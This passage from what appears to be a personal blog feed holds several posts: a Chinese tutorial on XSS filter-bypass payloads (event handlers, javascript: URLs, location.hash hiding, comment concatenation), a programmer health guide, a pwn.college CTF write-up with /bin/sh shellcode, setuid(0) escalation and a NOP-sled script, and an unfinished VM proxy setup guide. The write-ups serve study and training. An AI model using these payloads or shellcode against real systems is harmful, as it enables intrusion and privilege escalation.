class="code"><pre><code class="hljs xml">&lt;scr<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>ipt&gt;....<br></code></pre></td></tr></table></figure><h4 id="事件处理程序"><a href="#事件处理程序" class="headerlink" title="事件处理程序"></a>事件处理程序</h4><p>  很多 HTML 节点都可以绑定事件处理程序，比如 img 标签，指定一个错误或不存在的 src 属性，载入图像失败时就会触发 onerror 事件：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=0 <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;alert(document.cookie);&quot;</span>&gt;<br></code></pre></td></tr></table></figure><p>  还有很多类似的事件：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;object <span class="hljs-attribute">onerror</span>=alert(document.domain)&gt;<br>&lt;input <span class="hljs-attribute">onfocus</span>=alert(document.domain)&gt;<br>&lt;video <span class="hljs-attribute">src</span>=0 <span class="hljs-attribute">onerror</span>=alert(document.cookie)&gt;<br>&lt;svg <span class="hljs-attribute">onload</span>=alert(document.domain)&gt;<br></code></pre></td></tr></table></figure><p>  构造不同的 HTML 标签并尝试使用不同的事件处理程序，可以绕过一些过滤不严格的安全防御机制。</p><h4 id="JavaScript-伪协议"><a href="#JavaScript-伪协议" class="headerlink" title="JavaScript 伪协议"></a>JavaScript 伪协议</h4><p>  浏览器可以接受内联的 JavaScript 代码作为 URL。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">javascript:alert(1)</span>&gt;</span>Click me<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">sec</span>=<span class="hljs-string">javascript:alert(2)</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br>...<br></code></pre></td></tr></table></figure><p>  一些安全功能会滤掉 JavaScript 伪协议，可尝试插入空白字符绕过：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;java&amp;#13script&amp;#9:alert(document.domain)&quot;</span>&gt;</span>click me<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p>  当开发者仅仅校验 host 是否为合法域名，而没有校验协议时：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">javascript</span>://example.com/%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aalert(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>  其中的”//example.com”被当作 JavaScript 代码的注释，所以整个代码都是合法可行的。</p><h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><p>  关于长度限制：</p><p>  可以利用事件减少字节数，最好的办法是将 XSS Payload 写到别处，再通过简短的代码加载这段 XSS Payload。</p><p>  最常用藏代码的地方就是“location.hash”。根据 HTTP 协议 ，location.hash 内的内容不会在 HTTP 请求中发送，所以服务端的 Web 日志并不会记录 location.hash 的内容，从而隐藏了攻击者的真实意图。</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">?<span class="hljs-keyword">var</span>=<span class="hljs-string">&quot; onclick=&quot;</span>evil(location.<span class="hljs-built_in">hash</span>.substr(<span class="hljs-number">1</span>))<br></code></pre></td></tr></table></figure><p>  输出后的 HTML：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;input value<span class="hljs-operator">=</span><span class="hljs-string">&quot;&quot;</span> onclick<span class="hljs-operator">=</span><span class="hljs-string">&quot;evil(location.hash.substr(1))&quot;</span> /&gt;<br></code></pre></td></tr></table></figure><p>  因为 location.hash 第一个字符为 #</p><p>  所以构造的 XSS URL 为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://example.com/test.php?var=<span class="hljs-string">&quot;</span><br><span class="hljs-string">onclick=&quot;</span><span class="hljs-built_in">eval</span>(location.hash.substr(1))<span class="hljs-comment">#alert(1)</span><br></code></pre></td></tr></table></figure><p>  当有多个变量值时，例如：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;input <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$name</span>&quot;</span>&gt;<br>&lt;input <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$email</span>&quot;</span>&gt;<br>&lt;input <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;phone&quot;</span> <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$phone</span>&quot;</span>&gt;<br></code></pre></td></tr></table></figure><p>  可以拼接代码，利用注释，将三行连成一句话。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">?name=&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-comment">/*&amp;email=*/</span><span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">domain</span>)<span class="hljs-comment">/*&amp;phone=*/</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>  三个参数被拼接成完成的一句话：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;input <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;&quot;</span>&gt;&lt;script&gt;/*&quot;&gt;<br>&lt;input <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;*/alert(document.domain)/*&quot;</span>&gt;<br>&lt;input <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;phone&quot;</span> <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;*/&lt;/script&gt;&gt;</span><br></code></pre></td></tr></table></figure><p>  其包含了完整的 JavaScript 代码，可以正常运行。</p><h4 id="base-标签"><a href="#base-标签" class="headerlink" title="base 标签"></a>base 标签</h4><p>  base 标签用于定义该页面上，所有相对路径的 host 地址。</p><p>  如果 base 标签被攻击者劫持，就可以在远程服务器上伪造图片、链接或脚本，劫持当前页面中所有使用“相对路径”的标签。</p><p>  在设计 XSS 防御方案时，一定要过滤掉这个非常危险的标签。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>程序员健康指南</title>
    <link href="/2024/02/25/%E7%A8%8B%E5%BA%8F%E5%91%98%E5%81%A5%E5%BA%B7%E6%8C%87%E5%8D%97/"/>
    <url>/2024/02/25/%E7%A8%8B%E5%BA%8F%E5%91%98%E5%81%A5%E5%BA%B7%E6%8C%87%E5%8D%97/</url>
    
    <content type="html"><![CDATA[<h1 id="程序员健康指南"><a href="#程序员健康指南" class="headerlink" title="程序员健康指南"></a>程序员健康指南</h1><p>“从一个周身疼痛、病弱且极有可能脾气暴躁的黑客， 转变成一个快乐的、高效的程序员。”</p><h2 id="第一章-做出改变"><a href="#第一章-做出改变" class="headerlink" title="第一章 做出改变"></a>第一章 做出改变</h2><p>即使你每天都去健身房锻炼，<strong>久坐</strong>仍可能提高心脏病的患病几率。成天待在室内可能会使免疫系统变弱，并大量消耗体内的<strong>维生素D</strong>，而缺乏维生素D会对健康造成多方面的影响。</p><p>第一个开始吧：健康的站立。</p><p>每天早晨，像Scrum开发或者其他敏捷开发一样，你得和自己来一次快速的计划会议（可以的话，和一些朋友也行）。在每日站立例会上，要问自己三个问题。 </p><ul><li>昨天我做了什么去改善健康状况？ </li><li>今天我要做点什么来改善健康状况？ </li><li>有没有什么东西正在阻碍我保持健康状态？</li></ul><p>下面的图展示了迭代式升级健康的全局情况。可以这样理解，外层的圆圈由<strong>目标驱动</strong>，内层的圆圈则由<strong>日常清单驱动</strong>。</p><p><img src="/2024/02/25/%E7%A8%8B%E5%BA%8F%E5%91%98%E5%81%A5%E5%BA%B7%E6%8C%87%E5%8D%97/p1.png"></p><h3 id="关于奖赏、成瘾"><a href="#关于奖赏、成瘾" class="headerlink" title="关于奖赏、成瘾"></a>关于奖赏、成瘾</h3><p>  “对查德而言，相同的奖赏正是他能将新习惯坚持下来的原因。现在，吃一餐健康的食品让他感觉很舒服，和从前吃一餐不健康的食品带给他的感觉并无二致。事实上， 查德已经开始对不健康食品感到厌倦了。“我把每个周六都当成作弊日，或者狂欢节，” 查德说，“但一次比一次恶心，我现在对这一天越来越没有期待了。””</p><p> 为完成正确的事情而感到<strong>舒服</strong>，进而形成习惯，良好的习惯。</p><h2 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h2><h3 id="费马大定理与怀尔斯"><a href="#费马大定理与怀尔斯" class="headerlink" title="费马大定理与怀尔斯"></a>费马大定理与怀尔斯</h3><p>  一直到1995年，英国数学家安德鲁·怀尔斯才成功证明了这个猜想，而且他的证明过程来之不易。怀尔斯躲在他的阁楼里，暗地里使劲，将问题逐个解决，前后奋战了八年。费马大定理的知名度非常高，所以这项工作必须秘密进行。要是怀尔斯正致力证明这条定理的消息传了出去，各种干扰必定会接踵而至。</p><p>  当怀尔斯将他的证明公诸于世的时候，整个数论领域好像被打了强心针。不过人们最想问他的问题，并不是关于数学的。他们想知道，怀尔斯独自工作了那么长的时间，如何还能保持创造力，如何还能产生新的想法。他的回答很令人惊讶。</p><p><strong>“我会出去散步”</strong>在西蒙·辛格的《费马大定理》[Sin98]一书中，怀尔斯告诉西蒙，“我发现在散步的时候，我能将注意力集中于问题的某一个方面，完全专注地思考它。我手头总备有纸笔，一有什么想法，立马就可以在路边的长凳上坐下来演练。”</p><p>  步行是一项很强大的活动。它可以促进创造性思考，而且是让身体健康起来的最好方式。说真的，<strong>几次轻快的散步比健身房里的一次有氧运动效果要好得多</strong>。</p><p>  期刊<code>Medicine and Science in Sports and Exercise</code>发表过一项实验报告，受试者被要求记住一串字母，就像你刚才那样。接下来，实验规定他们要么静坐，要么跑步。在后来的测试中，<strong>跑步</strong>的受试者比静坐的受试者记忆的结果更快、更准确。</p><p>“有一类叫做<strong>脑源性神经营养因子（Brain-Derived Neurotrophic Factor，BDNF）</strong>的蛋白质，最有可能解释记忆力和体育锻炼之间的联系。这种蛋白质的作用是增强神经元之间的联系。事实证明，<strong>体育锻炼能促进BDNF的产生</strong>。BDNF和记忆力之间的联系被发现之后不久（该发现获得了诺贝尔奖），加州大学欧文分校的一位研究者设计了一个实验，结果显示，在滚轮上奔跑的老鼠比不活动的老鼠产生的BDNF多”</p><h3 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h3><p>研究显示，<strong>在学习新事物之前或之后进行体育锻炼</strong>，能帮你巩固记忆。</p><h3 id="再来个小结论"><a href="#再来个小结论" class="headerlink" title="再来个小结论"></a>再来个小结论</h3><p>此处省略了很多作者的调查过程，直接谈结果：</p><p>CDC现在建议，为了确保步行强度，人们每天最好在30分钟内快步走3000步，或者说在10分钟内快步走1000步。怎么分配步行时间倒是其次，<strong>关键是每天至少要走上20分钟</strong>。经证明，步行的这20分钟非常有用。</p><p>研究中强调，受试者的步行强度应该以个人**最大摄氧量（VO2max）的50%<strong>为准。和心率比较，这个说法好像复杂了些，因为每个人情况都各不相同。一般来说，</strong>最大摄氧量（VO2max）的50%大约是最大心率（HRmax）的60%**。 最大心率可以用220减去你的年龄得出。平均30岁左右的人，其基准心率需达到每分钟114下（114BPM），达到这个数值的运动才是最有效果的。这与CDC经常推荐的那个“快步走”的建议，可谓是英雄所见略同。</p><p><strong>根据上述内容，作为20岁出头的青年，锻炼时心率在120左右最佳。</strong></p><p>本人曾喜欢中距离跑步（5km上下），写下此段文字之时，正值寒冬，故运动停止了很长一段时间。回想起之前跑步时的心率，约为140左右，对于跑步这种运动强度来说，应该是很合适的。如此推测，有意识的快走心率估计在120左右，也是合理的。</p><p>题外话，天气将回暖，春季会有很多马拉松活动可参加，集中在四月、五月居多。去年此时，<strong>笔者从零基础的普通人开始训练跑步能力，持续锻炼约50天后，参加了人生第一场半马比赛并成功完赛</strong>。跑步是一个很明显的一分耕耘一分收获的运动，从最初以7分配（一公里耗时7分钟）跑2km都坚持不下来，一直到后来的5分多配跑5km，最后成功完赛半马，成长是很明显的，何况只消耗了50余天的时间。</p><p>过完了年，本人又肥了一圈，运动能力下降至“7分配（一公里耗时7分钟）跑2km都坚持不下来”的状况，待天气回暖，重返湘江之滨，重启跑步计划。</p><h3 id="学会正确步行"><a href="#学会正确步行" class="headerlink" title="学会正确步行"></a>学会正确步行</h3><p>学会跑，得先学会走路，但在走路前，还得先学会怎么走。绝大数人不怎么留意他们的走路姿势，因为走路是再经常不过的事情了。但是，使用正确的步行姿势，就能降低受伤的风险，事半功倍，使人尽享运动乐趣。</p><ul><li><strong>屈臂</strong></li></ul><p>你不会在跑步时伸直手臂，所以步行时也应保持屈臂。步行时，手臂应微微屈起，手臂移动时也应保持这个姿势，后摆时也不要伸直。另外，约束手臂，不要随意甩动，<strong>想象你握着一个手电筒</strong>，在走路的过程中，<strong>保持它指向前方</strong>。</p><ul><li><strong>从脚后跟滑倒脚趾</strong></li></ul><p>脚落地时，应该把重心先落到脚后跟上，然后顺势滑到脚趾。这个过程应该自然过渡。但随着步速加快，强度增加，你就应该更加留心，确保动作的整个过程正确无误。向前迈进时，最好脚后跟先着地。脚趾接着往胫骨的方向抬起。这个动作能加大身体的活动范围。</p><ul><li><strong>步幅缩小，步速放快</strong></li></ul><p>当我们尝试着提高步速和强度时，放大步幅是常见的错误。这样确实能提速， 但同时脚掌和脚趾会受到很大的挤压，这时候就很容易受伤了。最好的提速方法是缩小步幅，放快速度。这会降低对大腿的冲击，更能有效地提高心率。</p><ul><li><strong>用腹部呼吸</strong></li></ul><p>如果留心观看像环法自行车赛这种专业级的自行车比赛，也许会注意到绝大多数参赛选手都有一个啤酒肚。和顶尖选手相比，这种肚围还算是小的。实际上，他们是用腹部呼吸的，这样有助于增加吸氧量。如果不用腹部呼吸，肺部就无法充分地排出空气，也无法充分地吸入更多新鲜的空气。 </p><p>现在就试试用腹部呼吸吧，<strong>当你吸气时，尽量把你的肚子往外顶</strong>，能顶多高就多高。<strong>当你呼气时，则把肚子尽量往脊椎处拉</strong>。要是你一开始觉得很怪异，就在平躺时试试这个动作。这个技巧能有助于把呼和吸两个动作做到位，而且不会上气不接下气。</p><p>采用正确的走路方法，就像用正确的程序范例来学编程一样。进行这两样活动有很多种方法，但<strong>如果想成功，就得不停地练习。</strong></p><h3 id="到户外去"><a href="#到户外去" class="headerlink" title="到户外去"></a>到户外去</h3><ul><li><strong>提前做好准备</strong></li></ul><p>提前做好准备可以清扫很多障碍。如决定2小时后去跑步，那就立刻行动起来，把跑步衣裤鞋子都准备好，钥匙装进跑裤的钥匙兜内，手环充上电！如此一来，到了需要出门的时候，就可以很轻松地直接开跑，而且，<strong>你会更讨厌把准备好的东西重新收进衣柜，而不是出去痛快地跑上一小时！</strong>做好准备，可以从客观层面与心理层面一起发挥作用，让行动不再拖拉。</p><ul><li><strong>找个伴</strong></li></ul><p>笔者这边虽然找不到，但是找个伴确实应该是有用的。互相督促，都是诚信当先的成年人，有道德这个东西来在你屁股后面拿着鞭子审视着你：“跟别人都约好了，请不要失信于人！”</p><ul><li><strong>夜晚也许是个好选择</strong></li></ul><p>只要有能用的闪光灯或者手电筒，深夜的黑暗也不该阻止你步行，尤其在冬天那几个夜长昼短的月份里。在黑夜里走路，能够一扫幽居病带来的抑郁情绪。当然了，如果你身处一个不安全或陌生的地区，额外的防护还是必需的。</p><h3 id="记录一下散步"><a href="#记录一下散步" class="headerlink" title="记录一下散步"></a>记录一下散步</h3><table><thead><tr><th>Date</th><th>距离/时间</th><th>备注</th></tr></thead><tbody><tr><td>2.26</td><td>5.0km/1h</td><td>感觉行走5km比跑步5km腿更酸一点！</td></tr><tr><td>2.28</td><td>2.5km/0.5h</td><td>感觉这个距离和时长适合散步。</td></tr><tr><td>3.2</td><td>2.0km/14min</td><td>重启跑步，太久未运动，虽然很难，慢慢来！</td></tr></tbody></table>]]></content>
    
    
    
    <tags>
      
      <tag>health</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>The pwn.college</title>
    <link href="/2023/11/07/The-pwn-college/"/>
    <url>/2023/11/07/The-pwn-college/</url>
    
    <content type="html"><![CDATA[<h1 id="Pwn-with-pwn-college"><a href="#Pwn-with-pwn-college" class="headerlink" title="Pwn with pwn.college"></a>Pwn with pwn.college</h1><h1 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h1><h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><p>The most basic skills for writing shellcode:</p><p>Firstly, write down the assemble codes as</p><figure class="highlight plaintext"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><pre><code class="hljs asm">.global _start<br>_start:<br>.intel_syntax noprefix<br>           mov rax, 59<br>           lea rdi, [rip+binsh]<br>           mov rsi, 0<br>           mov rdx, 0<br>           syscall<br>binsh:<br>           .string &quot;/bin/sh&quot;<br># shellcode.s<br></code></pre></td></tr></table></figure><p>then make it with gcc:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -nostdlib -static shellcode.s -o shellcode-elf<br></code></pre></td></tr></table></figure><p>and copy it as raw code:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">objcopy --dump-section .text=shellcode-raw shellcode-elf<br></code></pre></td></tr></table></figure><p>now, we have the file <code>shellcode-raw</code>  with shellcode in it.</p><p>just use the following commands to pwn the target program</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">(<span class="hljs-built_in">cat</span> shellcode-raw ; <span class="hljs-built_in">cat</span>) | ./target<br></code></pre></td></tr></table></figure><p>e.g. target is a program like</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">bye1</span><span class="hljs-params">()</span> &#123; <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Goodbye!&quot;</span>);&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">bye2</span><span class="hljs-params">()</span> &#123; <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Farewell!&quot;</span>);&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">hello</span><span class="hljs-params">(<span class="hljs-type">char</span> *name , <span class="hljs-type">void</span> (*bye_func)())</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; Hello %s!\n&quot;</span>, name);<br>bye_func();<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc , <span class="hljs-type">char</span>** argv)</span><br>&#123;<br><span class="hljs-type">char</span> name[<span class="hljs-number">1024</span>];<br>gets(name);<br><br>srand(time(<span class="hljs-number">0</span>));<br><span class="hljs-keyword">if</span> (rand() %<span class="hljs-number">2</span>) hello(bye1,name);<br><span class="hljs-keyword">else</span> hello(name , bye2);<br>&#125;<br><span class="hljs-comment">//this program will execute what we input as it mistook the order of char* and func :P</span><br></code></pre></td></tr></table></figure><p>back to level1, the given program will execute the shellcode we inject, and let’s see what will happen:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim">//terminal<br><span class="hljs-keyword">cat</span>: flag: Permission denied<br>sudo <span class="hljs-keyword">cat</span> flag<br>sudo: effective uid <span class="hljs-keyword">is</span> not <span class="hljs-number">0</span>, <span class="hljs-keyword">is</span> sudo installed setuid root?<br><br></code></pre></td></tr></table></figure><p>Although we get the shell, we didn’t get root privilege.</p><p>Modify the shellcode.s:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs asm">.global _start<br>_start:<br>.intel_syntax noprefix<br><br>    mov rax, 0x69<br>mov rdi, 0<br>syscall <br><br>    mov rax, 59<br>    lea rdi, [rip+binsh]<br>    mov rsi, 0<br>    mov rdx, 0<br>    syscall<br>binsh:<br>           .string &quot;/bin/sh&quot;<br><br></code></pre></td></tr></table></figure><p>and try it again, surprisingly, it works!</p><h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><p>As it says, this challenge will randomly skip up to 0x800 bytes in our shellcode.</p><p>So, we will make use of the NOP instruction to pass this challenge.</p><p>The NOP instruction will lead to No Operation in executing.</p><p>This is my solution:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># define the &quot;\x90&quot;</span><br>nop_padding = <span class="hljs-string">b&#x27;\x90&#x27;</span> * <span class="hljs-number">0x800</span><br><br><span class="hljs-comment"># path of the shellcode-raw</span><br>input_file_path = <span class="hljs-string">&#x27;shellcode-raw&#x27;</span>  <span class="hljs-comment"># 替换为你的文件路径</span><br><br><span class="hljs-comment"># get text</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(input_file_path, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> input_file:<br>    original_content = input_file.read()<br><br><span class="hljs-comment"># inject 0x800 of &quot;\x90&quot;</span><br>new_content = nop_padding + original_content<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(input_file_path, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> output_file:<br>    output_file.write(new_content)<br><br></code></pre></td></tr></table></figure><p> This python file helped us inject some NOP instructions at the beginning of <code>shellcode-raw</code>, then we execute the following command:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">(<span class="hljs-built_in">cat</span> shellcode-raw ; <span class="hljs-built_in">cat</span>) | ./babyshell_level2<br></code></pre></td></tr></table></figure><p>The nop scrolls across the screen quickly from top to bottom, we successfully make it slide over the useless bytes and make the program execute our actual shellcodes.</p><h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p>code:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs asm">.global _start<br>_start:<br>.intel_syntax noprefix<br><br>        mov al, 0x69<br>        xor rdi, rdi<br>        syscall<br><br>           mov al, 59<br>           mov ebx, 0x68732f6e<br>           shl rbx, 8<br>           mov bl, 0x69<br>           shl rbx, 8<br>           mov bl, 0x62<br>           shl rbx, 8<br>           mov bl, 0x2f<br>           push rbx<br>           mov rdi, rsp<br>           xor rsi, rsi<br>           xor rdx, rdx<br>           syscall<br></code></pre></td></tr></table></figure><p>more details will be updated later!</p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>给虚拟机及其终端挂上代理吧！</title>
    <link href="/2023/08/30/%E7%BB%99%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%8F%8A%E5%85%B6%E7%BB%88%E7%AB%AF%E6%8C%82%E4%B8%8A%E4%BB%A3%E7%90%86%E5%90%A7%EF%BC%81/"/>
    <url>/2023/08/30/%E7%BB%99%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%8F%8A%E5%85%B6%E7%BB%88%E7%AB%AF%E6%8C%82%E4%B8%8A%E4%BB%A3%E7%90%86%E5%90%A7%EF%BC%81/</url>
    
    <content type="html"><![CDATA[<h1 id="给虚拟机及其终端挂上代理"><a href="#给虚拟机及其终端挂上代理" class="headerlink" title="给虚拟机及其终端挂上代理"></a>给虚拟机及其终端挂上代理</h1><p>  今天（2023/08/30)中午，为了给 AFL 的 qemu-mode 配置环境，安装了一些奇奇怪怪的东西，导致我的 Ubuntu 20.04 桌面崩溃，查了许多方法均未能救回<del>（你感受过绝望吗）</del>。</p><p>  由于最近没拍快照，只能忍痛回滚至今年6月初的某快照；又花了不少时间将 xfuzz 项目重新 clone 下来，build 一下，随便测测我的 Radamsa 插件后，算是让 ubuntu 回到了能继续开发的状态。</p><hr><p>  回归正题，在重新 build AFL++ 时，要从 github 等仓库下载代码，而国内蛋疼的网络情况大家心里也很清楚，忍不了几十 kb/s 的下载速度，我决定给虚拟机上个代理。</p><h1 id="宿主机的配置"><a href="#宿主机的配置" class="headerlink" title="宿主机的配置"></a>宿主机的配置</h1><ul><li><p>clash</p></li><li><p>clash 有订阅的套餐可用</p><p>对的，宿主机翻墙大部分人应该都会，但是宿主机挂上梯子，虚拟机却访问不了 google 等网站，这就是需要解决的问题。</p></li></ul><h1 id="正式步骤"><a href="#正式步骤" class="headerlink" title="正式步骤"></a>正式步骤</h1><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>  宿主机中，<code>win + R</code>打开 cmd 命令行，输入<code>ipconfig</code>查看 WLAN 的 ip 地址</p><p><img src="/2023/08/30/%E7%BB%99%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%8F%8A%E5%85%B6%E7%BB%88%E7%AB%AF%E6%8C%82%E4%B8%8A%E4%BB%A3%E7%90%86%E5%90%A7%EF%BC%81/p1.png"></p><p>  如上图，但需要注意，是<strong>无线局域网适配器 WLAN</strong>的IPv4地址（用WIFI）的情况下</p><p>  打开VMWare，左上角【编辑】-&gt;【虚拟网络编辑器】</p><p><img src="/2023/08/30/%E7%BB%99%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%8F%8A%E5%85%B6%E7%BB%88%E7%AB%AF%E6%8C%82%E4%B8%8A%E4%BB%A3%E7%90%86%E5%90%A7%EF%BC%81/p2.png"></p><p>  选择VMnet8，修改【子网IP】，注意前两个数字应与之前看到的 Windows 中的IP地址一致，第三个数字要【<strong>不</strong>一致】，子网掩码无需修改。</p><p>  随后点击确定即可。</p><p>  此处可再次确认一下【虚拟网络编辑器】中的【NAT设置】和【DHCP设置】，网关IP前三项是否与子网IP相同，IP地址范围不能包含网关。</p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>  随后将该虚拟机的网络适配器改为 VMnet8</p><p><img src="/2023/08/30/%E7%BB%99%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%8F%8A%E5%85%B6%E7%BB%88%E7%AB%AF%E6%8C%82%E4%B8%8A%E4%BB%A3%E7%90%86%E5%90%A7%EF%BC%81/p3.png"></p><p>  接着打开 clash 